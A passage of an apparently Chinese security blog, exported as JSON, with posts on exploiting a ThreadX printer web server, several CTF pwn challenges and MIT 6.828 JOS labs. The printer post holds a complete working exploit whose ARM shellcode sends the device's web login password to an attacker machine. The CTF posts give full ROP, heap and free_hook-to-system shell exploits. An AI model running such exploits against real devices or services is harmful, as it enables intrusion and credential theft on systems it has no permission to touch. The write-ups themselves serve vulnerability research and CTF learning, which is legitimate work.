[{"title":"360实习记录补档","date":"2024-03-20T02:32:14.000Z","path":"2024/03274dfe3b.html","text":"0.前言2021年在360实习的时候挖的一个打印机洞，操作系统为ThreadX，服务端源码https://github.com/inniyah/webio/tree/master。 1.漏洞成因senderr函数中调用sprintf拷贝uri时存在全局数组溢出，能够修改web服务线程的TX_THREAD_STRUCT结构体。 vuln 2.利用方式2.1 非法字符截断的绕过造成溢出的字符串是用户http请求中的uri，它在服务器解析http请求header时会被wi_argterm截断，因此我们的uri中不能出现小于0x20的字节，对漏洞利用产生了很大的限制。 image-20211126182036808 image-20211207100825600 但只要我们发送的uri为’/‘并且后面紧接着就是’\\r\\n\\r\\n’，那么uri就会指向’\\r\\n\\r\\n’的位置，与rxend相同，从而uri&lt;rxend的条件无法满足，uri就不会被截断，因此’\\r\\n\\r\\n’之后的数据也会被当成是uri的内容，可以包含任意非0字节。 image-20211126182014329 2.2 TX_THREAD_STRUCT的伪造TX_THREAD_STRUCT结构体中比较重要的是前16项。我们需要伪造tx_thread_stack_ptr使得伪造线程被调度时的上下文为我们所控，此外tx_thread_priority调试发现需要为10，刚好其后的几个成员都需置为0。我们用发送邮件时写入签名的方式将伪造的线程结构体写入到全局变量中，调试得到其地址为0x6B46E78。 image-20211207101608706 2.3 unlink时的4字节写利用溢出我们可以修改TX_THREAD_STRUCT结构体中的tx_thread_ready_next和previous，利用链表的解链操作就可以向一个地址写4字节，我们向0x214E59C写入上一步伪造结构体的地址。0x214E59C是_tx_thread_priority_list中索引为10处，代表下一个要被调度的优先级为10的线程。 2.4 shellcode与线程栈的构造我们可以利用发送邮件时写入正文的方式将伪造的栈数据和shellcode写到全局变量中。随后在线程被调度切换上下文时就可以控制跳转到我们的shellcode处。 thread_schedule 2.5 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102from pwn import *from urllib import quoteimport requestscontext.arch=\"arm\"ip=\"192.168.50.238\"port=80lhost=\"192.168.50.196\"lport=8224def set_hostname(hostname): url=\"http://&#123;&#125;/hostname.htm\".format(ip) data=&#123;\"HostName\":hostname,\"action\":\"HostNameSubmit\"&#125; requests.post(url,data=data)def send_mail(sign,msg): url=\"http://&#123;&#125;/email.htm\".format(ip) data=&#123;\"MailFrom\":\"123456789@qq.com\",\"MailSubject\":\"asdasdasda\",\"MailSignature\":sign,\\ \"MailReplyTo\":\"123456789@qq.com\",\"MailMessage\":msg,\"action\":\"EmailSubmit\"&#125; requests.post(url,data=data)def transform(lhost): lhost=lhost.split('.') l1=0 for x in lhost: l1=(l1&lt;&lt;8)+int(x) return l1fake_t=0x6B46ebc-17*4sa=0x6B46F9cshellcode=\"\"\"mov r2,2push &#123;r2,r8&#125;pop &#123;r0,r8&#125;push &#123;r3,r4,r8&#125;mov r1,2eor r2,r2,r2mov r3,0x12mov r8,r3,LSL#16mov r3,0x90add r8,r8,r3,LSL#8add r8,r8,0xc4push &#123;r3,r8&#125;mov lr,r5pop &#123;r5,pc&#125;pop &#123;r3,r4,r8&#125;mov r1,%dmov r4,r1,LSL#8add r4,r4,%dmov r3,%dmov r5,r3,LSL#24mov r3,%dadd r5,r5,r3,LSL#16mov r3,%dadd r5,r5,r3,LSL#8add r5,r5,%dmov r3,2str r3,[r5,4]str r4,[r5,8]add r4,r5,4eor r3,r3,r3mov r1,r6mov r2,0x10mov r6,0x12mov r5,r6,LSL#16mov r6,0xa3add r5,r5,r6,LSL#8mov r8,r4push &#123;r5,r8&#125;pop &#123;pc&#125;\"\"\"%(lport&amp;0xff,(lport&amp;0xff00)&gt;&gt;8,(sa&amp;0xff000000)&gt;&gt;24,(sa&amp;0xff0000)&gt;&gt;16,(sa&amp;0xff00)&gt;&gt;8,sa&amp;0xff)shellcode=asm(shellcode)print(hex(len(shellcode)))lhost=transform(lhost)fake_thread1=\"DRHT\"+\"a\"*4+p32(0x06B46ebc)+p32(0x06B450Bc)+p32(0x06B47ebc)+p32(0x102C7FC)+\"a\"*8+p32(0x2538e34)+p32(0x2538e34)fake_thread1+=p32(0x2538B20)+p8(0xa)fake_thread1=fake_thread1.rjust(0x204-4*6-1+2,'a')fake_thread2=\"a\"*4+p32(0x40404040)+\"a\"*4*3+p32(lhost)+p32(0xffffffff)+p32(0x6B46F3c)+p32(0x20DF695)+\"b\"*4*2+\"c\"*4*5+p32(0x6B46F04)+\"a\"*4fake_thread2+=shellcode+p32(0xffffffff)*2+p32(lhost)send_mail(fake_thread1,fake_thread2)#pause()sh=remote(ip,port)payload='a'*853+'b'*(33-23)payload=\"GET /\\r\\n\\r\\n\"+\"a\"*0x3dpayload+=(\"DRHT\"+\"a\"*4+p32(0x2545420)+p32(0x2518ee0)+p32(0x35456db)+p32(0x102C7FC)+'a'*8).ljust(788,'a')payload+=\"DRHT\"+\"a\"*4+p32(0x25454e4)+p32(0x2538ee0)+p32(0x25456db)+p32(0x102C7FC)+'a'*8+p32(fake_t)+p32(0x214E59c-0x20)sleep(0.7)sh.send(payload)sh.close() 3.验证攻击机在局域网的ip为192.168.50.196。 image-20240320101246286 用nc监听8224端口。我们的shellcode会让目标向攻击机的8224端口发送一个udp报文，内容是web登陆密码。 image-20211207181135738","tags":[{"name":"挖洞","slug":"挖洞","permalink":"https://veltavid.github.io/tags/%E6%8C%96%E6%B4%9E/"}]},{"title":"2021V&NCTF-Pwn方向writeup","date":"2021-08-17T01:12:31.000Z","path":"2021/08f977f230.html","text":"年初打的一场个人赛，拿了Pwn方向第一。 1.LittleRedFlower题目首先给了libc地址。然后根据提示修改tcache_max_bins，想到可以增大tcache_max_bins来延长tcache_perthread_struct到可控制的堆块上，因此任意写一个字节用来将tcache_max_bins增大为0x240。关于tcache_perthread_struct的关键逻辑可以在malloc中找到，如下图所示。 image-20210314225447429 可以看出tcache bin size真正属于tcache_perthread_struct的部分固定为0x80大小，不会随tcache_max_bins改变。但是在根据请求的size寻找时还是用2*(size-0x20)/0x10来定位的，寻找tcache bin指向的堆块时也还是固定先加0x80。 我选择用的是0x14a0大小的堆块，此时标识其tcache bin size的地址位于一开始分配的0x210大小堆块中，其中size均为0x101，只需要再控制heap_base+0x290+0x840的地方为free_hook-0x110的地址即可。 然后就是setcontext一把梭了，只是需要找一个gadget来将rdi的相关值赋给rdx并且能够劫持之后的控制流，这个gadget位于0x154b20处。 image-20210314230310600 最终ROP调用mprotect加shellcode读出flag。 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788from pwn import *context.log_level='debug'context.arch='amd64'shellcode = asm(''' sub rsp, 0x800 push 0x67616c66 mov rdi, rsp xor esi, esi mov eax, 2 syscall cmp eax, 0 js failed mov edi, eax mov rsi, rsp mov edx, 0x100 xor eax, eax syscall mov edx, eax mov rsi, rsp mov edi, 1 mov eax, edi syscall jmp exit failed: push 0x6c696166 mov edi, 1 mov rsi, rsp mov edx, 4 mov eax, edi syscall exit: xor edi, edi mov eax, 231 syscall''' )#sh=process('./flower')#pause()sh=remote('node3.buuoj.cn',27152)sh.recvuntil('GIFT: ')libc_base=int(sh.recvline()[:-1],16)-0x1EB6A0print(hex(libc_base))free_hook=libc_base+0x1EDB20free_hook2=free_hook&amp;0xfffffffffffff000tmax_bins=libc_base+0x1EA2D0read_addr=libc_base+0x1111F0setcontext=libc_base+0x5803Dmprotect=libc_base+0x11BB40gadget_addr=libc_base+0x154B20pop_rdi=libc_base+0x26bb2pop_rsi=libc_base+0x2709cpop_rdx=libc_base+0x11c3b1write_addr=libc_base+0x111290sh.sendafter('anywhere',p64(tmax_bins+1))sh.sendafter('what?',p8(2))sh.sendlineafter('Offset:',str(0x830))sh.sendafter('Content:',p64(free_hook-0x110))sh.sendafter('size:',str(0x1450+4*0x10))frame=SigreturnFrame()frame.rsp = free_hook2frame.rdi = 0frame.rsi = free_hook2frame.rdx = 0x2000frame.rip = read_addrpayload=p64(0)+p64(free_hook-0x110+0x10)+p64(0)*4+p64(setcontext)+str(frame)[0x28:]#print(hex(len(payload)))#pause()sh.sendafter('&gt;&gt;',payload.ljust(0x110,'\\x00')+p64(gadget_addr))layout=p64(pop_rdi)+p64(free_hook2)+p64(pop_rsi)+p64(0x2000)+p64(pop_rdx)+p64(7)+p64(0)+p64(mprotect)+p64(free_hook2+8*9)sh.send(layout+shellcode)print(sh.recv())sh.interactive() 2.hhvmpwn题，操作码与操作数都固定为4字节。利用9和0xc这两种指令可以栈溢出。 用9将任意4字节写到v32[++v16+0x1000]中。 image-20210314231425490 用0xc将刚写入的数再写到栈上任意位置处。 image-20210314231500795 v32数组一共有2002个元素，因此下标从2006开始就是返回地址了。 构造的rop先利用puts函数泄露出libc相关地址再返回main函数。 第二次rop中先read一个flag字符串到内存中，然后orw读出flag即可。 image-20210314232543313 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *context.log_level='debug'def set_8(offset,value): return p32(9)+p32(value&amp;0xffffffff)+p32(0xc)+p32(offset)+p32(9)+p32((value&gt;&gt;32)&amp;0xffffffff)+p32(0xc)+p32(offset+1)#sh=process('./hh')#pause()sh=remote('node3.buuoj.cn',25073)pop_rdi=0x4011a3puts_got=0x601FA8puts_plt=0x4006F0main_addr=0x401084flag_addr=0x60Bd00code=set_8(1005,0)+set_8(1007,pop_rdi)+set_8(1009,puts_got)+set_8(1011,puts_plt)code+=set_8(1013,main_addr)sh.sendlineafter('choice :','1')sh.sendafter(\"code:\",code+p32(0x10))sh.sendlineafter('choice :','2')libc_base=u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))-0x6F6A0print(hex(libc_base))open_addr=libc_base+0xF70F0read_addr=libc_base+0xF7310write_addr=libc_base+0xF7370pop_rsi=libc_base+0x202f8pop_rdx=libc_base+0x1b92code=set_8(1005,0)+set_8(1007,pop_rdi)+set_8(1009,0)+set_8(1011,pop_rsi)+set_8(1013,flag_addr)+set_8(1015,pop_rdx)+set_8(1017,7)+set_8(1019,read_addr)#read \"flag\"code+=set_8(1021,pop_rdi)+set_8(1023,flag_addr)+set_8(1025,pop_rsi)+set_8(1027,0)+set_8(1029,pop_rdx)+set_8(1031,0)+set_8(1033,open_addr)code+=set_8(1035,pop_rdi)+set_8(1037,3)+set_8(1039,pop_rsi)+set_8(1041,flag_addr)+set_8(1043,pop_rdx)+set_8(1045,0x30)+set_8(1047,read_addr)code+=set_8(1049,pop_rdi)+set_8(1051,1)+set_8(1053,pop_rsi)+set_8(1055,flag_addr)+set_8(1057,pop_rdx)+set_8(1059,0x30)+set_8(1061,write_addr)sh.sendlineafter('choice :','1')sh.sendafter(\"code:\",code+p32(0x10))sh.sendlineafter('choice :','2')sh.send('./flag\\x00')sh.interactive() 3.White_Give_Flag初始化时将flag写入到一个随机大小的堆块中，这个堆块大小在0x310~0x510之间。 漏洞点如下图所示，其中v4是read的返回值。 image-20210315090637954 只要控制read返回值为0就会造成0x202120处数组的反向溢出，此时该位置是第四个堆块，可以泄露出其中存储的flag。通过shutdown可以使read返回值为0。 猜测题目环境是存在tcache的，所以先分配3个小于0x200的堆块，然后分配一个在0x310到0x510之间的堆块即可，不过还要保证堆块size字段最低字节大于等于0x20，最后在第4个堆块的前16字节填充垃圾数据。爆破得到flag。 flag exp: 123456789101112131415161718192021222324252627282930from pwn import *#context.log_level='debug'def add(size): sh.sendafter('choice:','\\n') sh.sendafter('size:\\n',str(size))def edit(index,content): sh.sendafter('choice:','aaa\\n') sh.sendafter('index:\\n',str(index)) sh.sendafter('Content:\\n',content)def show(): sh.sendafter('choice:','a\\n')#sh=process('./white')while(True): sh=remote('node4.buuoj.cn',39123) for i in range(3): add(0x20) add(0x350) edit(3,\"b\"*16) sh.shutdown() sh.recvuntil('choice:') res=sh.recvline() if('&#123;' in res): print(res) break sh.close() 4.ff题目存在uaf，但在分配了堆块之后就只能对该堆块操作。 思路是先利用2次edit绕过tcache的double free检测，然后可以分配堆块到tcache_perthread_struct，不过题目环境是glibc 2.32，存在safe linking保护，所以还需要show一次泄露异或后的堆地址。 分配到tcache_perthread_struct后将0x290大小的tcache bin容量改为7，再free掉进入unsorted bin中。此时可以通过切分tcache_perthread_struct将libc相关地址作为0x50大小的tcache bin指向的堆块。 随后修改残留的libc地址为stdout的地址，该步需要爆破，从而泄露出libc基址。 最后继续切分残留在unsorted bin中的tcache_perthread_struct将free_hook分配出来，修改为system拿shell。 flag exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *#context.log_level='debug'def add(size,content): sh.sendafter('&gt;&gt;','1') sh.sendafter('Size:',str(size)) sh.sendafter('Content:',content)def show(): sh.sendafter('&gt;&gt;','3')def free(): sh.sendafter('&gt;&gt;','2')def edit(content): sh.sendafter('&gt;&gt;','5') sh.sendafter('Content:',content) while(True): sh=remote('node3.buuoj.cn',26208) add(0x60,\"a\"*0x30+p64(0)+p64(0x51)) free() add(0x20,\"aaaa\") add(0x60,\"aaaa\") free() edit(p64(0)*2) free() edit(p64(0)*2) free() show() heap_addr=u64(sh.recv(8)) try: rand_num=(heap_addr&amp;0xffff)^0x2a0 guess=rand_num^0x10 add(0x60,p16(guess)) add(0x60,p64(0)) add(0x60,p16(0)*0x27+p16(7)) free() add(0x40,p16(0)*3+p16(2)+'\\x00'*4+p16(1)+'\\x00'*2) except: print(0) print(hex(heap_addr)) sh.close() pause() continue add(0x30,p8(0)) add(0x10,p64(0)+'\\xb0'+'\\x96') try: context.log_level='debug' add(0x40,p64(0)*2+p64(0xfbad1887)+p64(0)*3+'\\x00') sh.recvuntil('\\x7f',timeout=3) libc_base=u64(sh.recvuntil('\\x7f',timeout=3)[-6:].ljust(8,'\\x00'))-0x1e39a0 if(libc_base&lt;0): libc_base=u64(sh.recvuntil('\\x7e',timeout=3)[-6:].ljust(8,'\\x00'))-0x1e39a0 except: context.log_level='notset' print(1) sh.close() continue #pause() if(libc_base&lt;0): sh.close() continue print(hex(libc_base)) free_hook=libc_base+0x1E6E40 system_addr=libc_base+0x503C0 add(0x10,p64(free_hook)) add(0x70,p64(system_addr)) add(0x10,\"/bin/sh\\x00\") free() sh.interactive() break","tags":[{"name":"CTF","slug":"CTF","permalink":"https://veltavid.github.io/tags/CTF/"}]},{"title":"MIT-6.828-JOS-lab6实验笔记","date":"2021-08-17T01:10:20.000Z","path":"2021/08bf580101.html","text":"1. 总体结构本实验主要组成部分如实验指导中的图所示 ns E1000网卡对应的是数据链路层，Core network中的lwIP对应的是网络层与传输层，httpd对应的则是应用层。E1000 driver的实现是本实验的主要工作内容，它负责从E1000接收数据包或是发送数据包到E1000，此外几个helper也是我们需要实现的，它们使用ipc实现对network server数据包的收发，这些helper通过系统调用的方式与我们写的driver通信。这样一套完整协议模型主要是为了方便检验E1000 driver的实现正确与否，但我们对于网络协议的实现过程并不关心，所以直接使用了lwIP，这是一个轻量级的TCP/IP协议栈。 2. E1000 driverE1000的manual：https://pdos.csail.mit.edu/6.828/2018/readings/hardware/8254x_GBe_SDM.pdf init E1000网卡是PCI设备，在系统启动时会沿着PCI总线寻找存在的PCI设备，找到了就会调用事先注册了的初始化函数。这些初始化函数存储在pci_attach_vendor数组中，通过设备的vendor ID和device ID来确定调用哪个函数。这个数组单个元素构成如下所示。 初始化函数共完成4件工作： 启用设备为其分配资源 直接调用pci_func_enable函数。 映射设备寄存器到内存空间 调用mmio_map_region从为mmio留出的虚拟内存空间中割一块下来。 transmit相关寄存器初始化设置 参照manual 14.5节。 receive相关寄存器初始化设置 参照manual 14.4节。不过manual对于RDH和RDT初始化描述的不太准确，这两个寄存器其实存的并不是队列头尾地址，而是队列的索引，RDH为0，RDT为索引最大值。 DMA E1000 driver的作用是更高效地传递数据包，试想一下没有它的话，我们就只能通过直接读写E1000的寄存器来传输数据了，这无疑是低效率的。有了这个driver之后，它会维护两个循环队列，一个存储待transmit的数据包，另一个存储待receive的数据包，队列中的元素是描述符，除了包含数据包的内容还存有该数据包状态以及控制字段。这样的话只需要将这两个队列的指针和队列大小传递给E1000寄存器，E1000就能够读写driver内存中的数据包，事实上这正是init中设置寄存器中的一部分。循环队列使用头指针与尾指针来描述，在头指针与尾指针之间的就是可用的数据包，driver通过调节这2个指针来通知E1000数据包的处理情况。注意所有指针都需要使用物理地址，因为E1000是直接读写物理RAM的，不会经过MMU进行地址转换。以上就是DMA(直接内存存取)的描述。 transmit 这个操作的方向是network server-&gt;E1000，也就是向外发送数据包。队列头指针指向的描述符是当前正被发送的数据包，尾指针指向的描述符是待添加的数据包。需要注意的是，尾指针指向的描述符包含的数据包不一定是空闲的，也有可能正被E1000处理，说明此时待发送的数据包已满，所以我们需要判断状态中的DD位是否为1，若为1才说明该数据包已处理完毕，若不为1的话driver就需要返回错误信息。在添加数据包到队列时，需要设置控制字段中的RS和EOP，前者是为了E1000在处理完数据包后自动设置DD位，后者标识数据包分片的结尾，因为本实验中不会出现大到需要分片的数据包，所以每次发送都可以设置。 receive 这个操作的方向是E1000-&gt;network server，也就是接收外来数据包。队列头指针指向的描述符是当前收到的数据包，尾指针指向的描述符包含的是刚接收过的数据包。因此receive中先将尾指针自增，再判断描述符状态中DD位是否为1，若不为1则说明当前队列是空的，需要返回错误信息。 3. output/input helperoutput比较简单，循环地调用ipc_recv接收network server发来的数据包，然后使用系统调用传给E1000 driver即可。 input需要维护一个队列，队列中每个元素大小为1页，取当前元素作为ipc_send的参数。这么做的原因是当input调用完ipc_send后就会继续去接收E1000传来的下一个包，然后立刻发送给network server，若是仍像output一样使用nsipcbuf来存储参数，那么可能network server还没处理完上一个包的内容，数据就已经被这个包给覆盖了。 4. question &amp; code关于这部分的内容欢迎dalao斧正。 How did you structure your transmit implementation? In particular, what do you do if the transmit ring is full? 队列未满时直接设置好RS与EOP，然后将数据包加入队列，再自增TDT。队列满了就返回失败信息。 How did you structure your receive implementation? In particular, what do you do if the receive queue is empty and a user environment requests the next incoming packet? 先自增RDT，再判断RDT对应描述符DD位，若为1则说明有包，拷贝到buf中并设置好size参数返回。队列为空则返回失败信息。因此input helper中需要循环调用recv包的系统调用直到接收到数据包。 What does the web page served by JOS’s web server say? This file came from JOS. Cheesy web page! How long approximately did it take you to do this lab? 花费了大约3天，有1天时间浪费在实现receive中断上，但发现即使按manual上说的设置好了IMS和RDTR寄存器也不会产生中断，遂放弃。卡住我的另一个地方是RDH与RDT的设置上，按manual说的设置总是无法正常收到包。 https://github.com/veltavid/mit-6.828-jos-study/tree/lab6","tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://veltavid.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"MIT-6.828-JOS-lab5实验笔记","date":"2021-08-17T01:10:15.000Z","path":"2021/082926dcf.html","text":"1. 文件系统基本结构 扇区与块 硬盘的存储以扇区为单位，在JOS中一个扇区大小是512字节，这个数字比较小，而磁盘又是低速设备，如果每次操作系统就读一个扇区的数据效率未免太低，因此在实现硬盘读写时操作系统是按若干个扇区进行一次操作的，这种单位被称为块，不难看出块大小一定是扇区大小的整数倍。在JOS中，块大小与页大小相同，都为4KB。 超级块 这是用来存储写死了的基本参数的地方，例如块大小，磁盘大小，或是描述根目录的数据，与项目中的配置文件功能类似。随文件系统的复杂程度超级块的数目也会不同，在JOS中我们只需要一块就能够记录完这些必要的数据，因此我们的第1个块就是超级块(第0块用于存储更基本的数据，如bootloader，页表等)。 文件元数据 所谓元数据就是描述数据的数据，与之前的许多lab相同，我们使用结构体来描述一个东西。File结构体的结构如下图所示 可以看出用于描述文件的属性有名字，大小，以及存储文件数据的块序号。不难看出文件数据的存储不是连续的，只是块内的数据连续，总体上是以块为单位散乱分布的，这种设计能够有效提供空间利用率。对于小文件，我们可以直接使用10个块序号来获取数据；而大文件也可以使用间接块指针获取一个存储了块序号的索引表来获取数据。在JOS中支持的最大文件大小为1034个块，约4.04MB。在现代操作系统中会使用更多级的索引来支持更大的文件。 此外，File结构体还可以用来描述文件夹，只是原本存储文件数据的块中变为存储代表文件的File结构体数组。二者通过File结构体中的f_type属性来区分。 2. 文件系统 I/O权限控制 JOS实现用户读写磁盘的方法是启动一个特殊的用户进程，称为文件系统进程，专门赋予其IOPL权限，因此它能够执行in和out指令，而其他的用户进程都是无权进行磁盘I/O的，因此要进行磁盘读写只能通过IPC与文件系统进程通信来完成；在现代操作系统中实现磁盘I/O的部分则是在内核中的，通过驱动实现，为用户提供服务的接口就是系统调用。 块缓存 磁盘是低速设备，如果每次读写磁盘数据都要访问磁盘，即使按块访问效率也太低。因此文件系统进程将用到的磁盘数据写入到内存中以供其他进程访问，在内存中进行多次修改的开销将会远小于磁盘，直到执行刷新操作才将更改后的数据写回磁盘。在文件系统进程中，从0x10000000开始到0xD0000000总计3GB的虚拟内存空间都用于磁盘I/O，该进程的缺页处理函数会将读入了磁盘数据的物理页与这部分空间中的虚拟内存建立映射。因此JOS能支持的缓存大小为3GB。 要将磁盘中的3GB数据一次性读入内存是非常耗时的事情，因此JOS注册了一个缺页处理函数，只有当某个地址被访问到了，再从磁盘读入内存，这与高速缓存的实现思路相同，不同的地方是块缓存不会出现冲突而被换出的情况。 bitmap 这个数据结构用于记录每个块的空闲状态，每个块用1bit来表示，1为空闲，0为在使用，因此bitmap中每个元素可以存储32个块的状态。 文件操作 基本函数调用顺序：walk_path-&gt;dir_lookup-&gt;file_get_block-&gt;file_block_walk file_block_walk 获取指向某个文件中第n块的块序号指针。若n超过10，则需要到f_indirect中找，f_indirect为空的话则根据alloc设置与否决定是否分配块给f_indirect。 file_get_block 调用file_block_walk获取指向文件块序号的指针，如果指针指向一个空值，则为它分配一个块。 dir_lookup 遍历dir文件夹所有块中的File结构体，比较其name属性是否与要找的文件或文件夹相同。 walk_path 将path按’/‘分割得到一系列文件夹以及最终要找的文件，从超级块获得的根目录开始用dir_lookup寻找，每次找到了则下一回从新找到的目录继续找新的文件夹，直到最终找到文件。 基本操作可分为文件开启创建操作，文件读写操作和针对块的操作，第一种调用walk_path寻找目标文件，第二种根据传入的File结构体按块操作即可，第三种调用file_block_walk找到目标块进行操作。 文件系统接口 在I/O权限控制中我们提到，JOS中只有文件系统进程拥有磁盘I/O操作权限，其他进程想要读写磁盘数据必须通过IPC与文件系统进程通信才行。 因此文件系统进程在初始化文件系统之后就会进入死循环，为发出请求的进程提供服务，发出请求的进程通过设置传递的值来选择要执行的文件操作，通过映射物理页来传递参数——服务器使用0x0ffff000映射到传递的参数。除了open操作需要映射客户端虚拟地址到物理页以外，其余操作都不需要，实际上open操作是共享了一个fd结构体，其结构如下图所示 在共享了这个fd结构体之后，通信双方就能共享文件偏移，并且客户端能够通过文件id来指定要操作的文件。服务端使用一个OpenFile结构体数组来管理所有打开的文件，它是连接文件描述符fd与文件本身的桥梁。 image-20210805222631875 ​ 当接收到客户端传来的文件id时以其为索引到OpenFile结构体数组中找出对应文件的File结构体，配合上一部 分中实现的文件操作函数完成读写等操作。最后操作的返回值通过ipc_send返回给客户端。 3. spawn启动子进程spawn与fork很类似，区别在于fork创建的子进程与父进程执行的是同一个程序，spawn会加载其他程序然后在新建的子进程环境中运行。因此，fork需要拷贝(Copy-on-Write)父进程的内存，而spawn不需要。但有一些东西不论fork还是spawn创建的子进程都需要与父进程共享，例如文件描述符，如果不共享那么进程间将无法通过管道通信；还有各种共享库等等。这些需要共享的内存在映射时被设置的权限多加上一个PTE_SHARE，这意味着新建子进程的这部分虚拟内存只需要映射到父进程中对应虚拟内存已经映射的物理页即可。 4. question &amp; code关于这部分的内容欢迎dalao斧正。 Do you have to do anything else to ensure that this I/O privilege setting is saved and restored properly when you subsequently switch from one environment to another? Why? 不需要，因为标识I/O权限的标志位在eflags寄存器中，在切换进程环境时这个寄存器的值是存储在trapframe中的，不用担心会被切换后的进程破坏，切换回来时自然也可以正常从trapframe中恢复。 https://github.com/veltavid/mit-6.828-jos-study/tree/lab5","tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://veltavid.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"MIT-6.828-JOS-lab4实验笔记","date":"2021-08-17T01:10:10.000Z","path":"2021/08df04b44a.html","text":"1. 多处理器支持与多任务实现 映射mmio的虚拟内存 mmio是一种与设备通信的方式，它将虚拟内存地址映射到设备的物理内存空间，在这些虚拟内存上读写即可实现与外部设备的通信。因此我们需要空出一些虚拟内存空间留作此用。 lapic初始化 由于我们内核被装载的物理地址较低，所以我们之前一直是通过+0xf0000000的虚拟内存地址映射到内核的物理地址。但lapic所在物理地址从0xFE000000开始，我们不能使用这种方式了，此时上一步留出的虚拟内存空间就可以在这步用上了。 接下来的工作是设置lapic实现定时产生时钟中断，这部分设置主要是通过mmio与硬件设备通信实现，下文中CPU的设置也类似，只是通信方式还有pmio，由于涉及到许多与本实验无关的CPU内部细节，不具体分析了。 BSP启动APs 该部分完成的工作是由自举CPU(BSP)拉起其他的CPU(AP)，在本实验中BSP固定为第一个CPU。它会将启动用的汇编指令(kern/mpentry.S)拷贝到物理地址0x7000处，设置好mpentry.S所需的栈地址（这块内存在mem_init中完成映射），然后与对应AP通信使其执行这些指令，然后BSP就会阻塞直到该AP启动完毕。mpentry.S使CPU进入保护模式并启动分页功能，最后调用了mp_main。这里有一个问题：为何mp_main的调用需要使用间接调用。因为mpentry.S中的指令会被拷贝到虚拟地址0xf0007000处运行，而这是编译器无法得知的，若是使用直接调用那么编译器会计算下一条指令与mp_main的偏移然后生成机器码，但由于真实运行时的地址变了，那么这个偏移自然是不正确的，所以必须使用间接调用。总结一下就是当一段机器码要被拷贝到其他地方使用时，就必须避免其中出现计算偏移的指令。 mp_main中为该AP初始化lapic，加载GDT和段描述符，初始化并在GDT中设置TSS。随后将状态设置为CPU_STARTED，告知BSP启动已完毕。最后调用sched_yield任务调度函数，寻找一个待执行的任务给该AP执行。 加锁 经过上一步，我们此时已经有多个AP在同时执行任务了，它们随时可能由用户态转换至内核态，因此必须要考虑避免条件竞争问题，尤其是在内核使用了大量全局变量的情况。所以要在trap函数中以及所有sched_yield前加锁，在env_run最后进入用户态之前释放锁即可。 两种加锁的位置可以抽象成进程处于内核态的时机，一个进程除了在启动时处于内核态，就只有可能通过中断进入内核态，前者对应i386_init与mp_main中加锁，后者对应在trap中加锁。 任务调度算法 sched_yield采用的调度算法是轮询算法(Round-Robin)，这个算法的原理是从上一次位置的后一个开始，循环地查询到上回的位置处，这个过程中将遇到的第一个RUNNABLE任务作为本次执行的任务。若是没有找到任何RUNNABLE的任务，而且上回的任务仍然处于RUNNING状态，就继续执行上回的任务。 2. Copy-on-Write的fork实现 多进程相关系统调用 在内核中需要实现一些多进程编程中可能会用到的系统调用，以方便用户调用。以下涉及到的所有进程均为当前进程或其子进程，涉及到的虚拟地址均为页对齐并且小于UTOP，涉及的权限设置中PTE_U 与PTE_P为必选，PTE_AVAIL与PTE_W为可选。不满足以上任意条件，我们的系统调用都会失败。 sys_exofork 分配出一个env，并把当前env作为其父进程，随后将父进程的trapframe拷贝给它，只是eax设置成0。等之后CPU运行这个进程返回用户态时，会返回到和父进程相同的位置，只是返回值变为了0。 sys_env_set_status 允许用户更改某个进程的状态为ENV_NOT_RUNNABLE或ENV_RUNNABLE。 sys_page_alloc 分配一个物理页，并将用户指定的虚拟内存地址映射到其上。 sys_page_map 将某进程的某个虚拟内存地址映射到某进程的某个虚拟内存地址所映射的物理页。 sys_page_unmap 解除某进程中一处虚拟内存地址与物理页的映射关系。 Copy-on-Write的意义 xv6中实现fork的方式是通过sys_exofork分配出子进程的env，然后调用sys_page_alloc与sys_page_map将子进程的虚拟内存都映射到物理页上，并将父进程的内存空间完整地拷贝到子进程的内存空间。这一步的开销是巨大的，每次fork都要消耗掉当前进程等量的物理页，然而子进程对这些内存空间可能并不会进行什么操作，例如shell中fork出的子进程主要负责调用execve系统调用执行命令，只是设置一下寄存器就进入内核态了，为子进程分配的物理页并没有派上实际用场。因此为了减少开销，对于fork出来的子进程我们让其与父进程共用物理页，只有当二者中有需要写入内存空间造成二者内存空间不一致时，我们再单独分配额外的物理页。 用户态缺页中断处理 在父进程fork出子进程后，它们映射的物理页权限都变为了COW，这意味着写入时会触发缺页中断。我们需要在page_fault_handler函数中实现用户态缺页中断的处理方法——之前我们只实现了内核态的处理。 用户态缺页中断处理的大体思路是将trapframe压入异常处理栈中，然后跳转到用户注册的异常处理函数（此时已经返回到用户态），这个函数负责调用真正处理异常的函数_pgfault_handler，处理完毕后无法回到内核态，必须直接在用户态下恢复原状态，因此要手动实现寄存器恢复与栈帧切换并返回发生缺页中断的那条指令，本实验中该函数为_pgfault_upcall。 缺页中断的情况可分为2种，一种是在缺页中断处理函数中又发生了缺页中断导致的嵌套中断，另一种是单纯的非嵌套中断。二者的区别在于发生异常时所使用的栈空间不同，前者使用的是异常处理栈，位于UTOP；后者使用的是用户栈。 嵌套中断 在嵌套中断中，我们在压入trapframe之前还要多压入4字节的空白数据，这是因为_pgfault_upcall恢复所有寄存器的同时还要返回发生异常的地址，它必须要在发生异常时使用的栈上压入返回地址，这样才能在恢复esp之后正确地恢复eip。如果我们不多加这4字节，由于嵌套中断中异常处理栈和发生异常时的栈实际上连在一起的，那么在压入返回地址时就会覆盖异常处理栈帧中的trapframe最高的4字节即esp。 非嵌套中断 非嵌套中断中我们不需要多压这4字节，只需要将栈帧转移到异常处理栈中，然后再压入trapframe。因为发生异常时的esp-4处肯定是无用的数据。 fork实现细节 以下是与dumbfork实现的不同之处。 调用sys_pgfault_handler为父进程设置_pgfault_upcall与_pgfault_handler duppage 